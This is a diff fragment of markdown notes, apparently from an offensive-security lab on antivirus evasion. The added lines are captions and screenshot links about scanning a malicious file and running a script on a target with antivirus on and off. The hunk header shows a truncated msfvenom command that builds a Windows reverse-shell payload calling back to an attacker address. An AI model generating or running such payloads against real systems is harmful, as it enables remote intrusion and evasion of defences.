@@ -11,5 +11,18 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.192 LPORT=443 EXITFUNC=t
 
 ```
 
+Scan directory with malicious file:
 
+![Alt text](directory_scan.png)
+
+
+Script stored on the target system execution without antivirus detection enable:
+
+
+![Alt text](antivirus_evasion2.png)
+
+Script stored on the target system execution with antivirus detection enable:
+
+
+![Alt text](antivirus_evasion_powershell.png)
 
